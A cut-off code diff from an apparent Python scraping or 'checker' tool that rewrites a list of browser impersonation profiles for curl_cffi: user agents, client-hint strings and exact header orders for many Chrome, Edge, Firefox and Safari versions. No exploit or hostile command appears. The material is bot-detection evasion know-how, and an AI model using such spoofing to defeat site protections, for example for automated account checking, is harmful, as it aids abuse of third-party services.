@@ -115,657 +115,233 @@ _CH = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
 _FF = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
 _SF = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
 
-# ── TLS Profiles (matching the working checker exactly) ───────────────────────
+# ── TLS Profiles — all 46 valid curl_cffi impersonate values ─────────────────
+_CH_HDR = ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"]
+_CH_HDRA = ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie","priority"]
+_FF_HDR = ["host","user-agent","accept","accept-language","accept-encoding","referer","connection","upgrade-insecure-requests","sec-fetch-dest","sec-fetch-mode","sec-fetch-site","sec-fetch-user","priority","cookie"]
+_SF_HDR = ["host","accept","sec-fetch-site","sec-fetch-dest","accept-language","sec-fetch-mode","user-agent","referer","accept-encoding","cookie"]
+_SF_IOS = ["host","sec-fetch-dest","user-agent","accept","referer","sec-fetch-site","sec-fetch-mode","accept-language","priority","accept-encoding","cookie"]
 TLS_PROFILES = [
-    {
-        "name": "Chrome 133 (Windows)",
-        "identifier": "chrome_133",
-        "impersonate": "chrome133a",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie", "priority",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 132 (Windows)",
-        "identifier": "chrome_132",
-        "impersonate": "chrome131",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie", "priority",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 131 (Windows)",
-        "identifier": "chrome_131",
-        "impersonate": "chrome131",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 130 (Windows)",
-        "identifier": "chrome_130",
-        "impersonate": "chrome131",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 124 (macOS)",
-        "identifier": "chrome_124",
-        "impersonate": "chrome124",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 120 (Windows)",
-        "identifier": "chrome_120",
-        "impersonate": "chrome120",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Edge 131 (Windows)",
-        "identifier": "chrome_131",
-        "impersonate": "chrome131",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
-        "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Firefox 135 (Windows)",
-        "identifier": "firefox_135",
-        "impersonate": "firefox133",
-        "header_order": [
-            "host", "user-agent", "accept", "accept-language",
-            "accept-encoding", "referer", "connection",
-            "upgrade-insecure-requests", "sec-fetch-dest",
-            "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
-            "priority", "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Firefox 133 (Windows)",
-        "identifier": "firefox_120",
-        "impersonate": "firefox133",
-        "header_order": [
-            "host", "user-agent", "accept", "accept-language",
-            "accept-encoding", "referer", "connection",
-            "upgrade-insecure-requests", "sec-fetch-dest",
-            "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
-            "priority", "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Safari 18 (iOS 18)",
-        "identifier": "safari_ios_18_0",
-        "impersonate": "safari18_0",
-        "header_order": [
-            "host", "sec-fetch-dest", "user-agent", "accept",
-            "referer", "sec-fetch-site", "sec-fetch-mode",
-            "accept-language", "priority", "accept-encoding", "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*",
-        "accept_lang": "en-GB,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Safari 17.5 (macOS)",
-        "identifier": "safari_15_6_1",
-        "impersonate": "safari15_5",
-        "header_order": [
-            "host", "accept", "sec-fetch-site", "sec-fetch-dest",
-            "accept-language", "sec-fetch-mode", "user-agent",
-            "referer", "accept-encoding", "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Safari 17.0 (macOS)",
-        "identifier": "safari_17_0",
-        "impersonate": "safari15_5",
-        "header_order": [
-            "host", "accept", "sec-fetch-site", "sec-fetch-dest",
-            "accept-language", "sec-fetch-mode", "user-agent",
-            "referer", "accept-encoding", "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 131 (Android)",
-        "identifier": "chrome_131_android",
-        "impersonate": "chrome131_android",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-        "sec_ch_ua_platform": '"Android"', "sec_ch_ua_mobile": "?1",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 129 (Windows)",
-        "identifier": "chrome_129",
-        "impersonate": "chrome129",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie", "priority",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 128 (Windows)",
-        "identifier": "chrome_128",
-        "impersonate": "chrome128",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie", "priority",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 127 (Windows)",
-        "identifier": "chrome_127",
-        "impersonate": "chrome127",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie", "priority",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 126 (Windows)",
-        "identifier": "chrome_126",
-        "impersonate": "chrome126",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 119 (Windows)",
-        "identifier": "chrome_119",
-        "impersonate": "chrome119",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 116 (Windows)",
-        "identifier": "chrome_116",
-        "impersonate": "chrome116",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.188 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 110 (Windows)",
-        "identifier": "chrome_110",
-        "impersonate": "chrome110",
-        "header_order": [
-            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
-            "upgrade-insecure-requests", "user-agent", "accept",
-            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
-            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
-            "cookie",
-        ],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9",
-        "accept_encoding": "gzip, deflate, br, zstd",
-    },
-    {
-        "name": "Chrome 109 (Windows)",
-        "identifier": "chrome_109",
-        "impersonate": "chrome109",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="109", "Not_A Brand";v="99", "Google Chrome";v="109"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 108 (Windows)",
-        "identifier": "chrome_108",
-        "impersonate": "chrome108",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 107 (Windows)",
-        "identifier": "chrome_107",
-        "impersonate": "chrome107",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="107", "Not=A?Brand";v="24", "Google Chrome";v="107"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 106 (Windows)",
-        "identifier": "chrome_106",
-        "impersonate": "chrome106",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="106", " Not;A Brand";v="99", "Google Chrome";v="106"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 105 (Windows)",
-        "identifier": "chrome_105",
-        "impersonate": "chrome105",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 104 (Windows)",
-        "identifier": "chrome_104",
-        "impersonate": "chrome104",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 103 (Windows)",
-        "identifier": "chrome_103",
-        "impersonate": "chrome103",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
-        "sec_ch_ua": '" Not;A Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 112 (Windows)",
-        "identifier": "chrome_112",
-        "impersonate": "chrome112",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "accept_api": "*/*", "accept_lang": "en-US,en;q=0.9", "accept_encoding": "gzip, deflate, br",
-    },
-    {
-        "name": "Chrome 111 (Windows)",
-        "identifier": "chrome_111",
-        "impersonate": "chrome111",
-        "header_order": ["host","sec-ch-ua","sec-ch-ua-mobile","sec-ch-ua-platform","upgrade-insecure-requests","user-agent","accept","sec-fetch-site","sec-fetch-mode","sec-fetch-user","sec-fetch-dest","referer","accept-encoding","accept-language","cookie"],
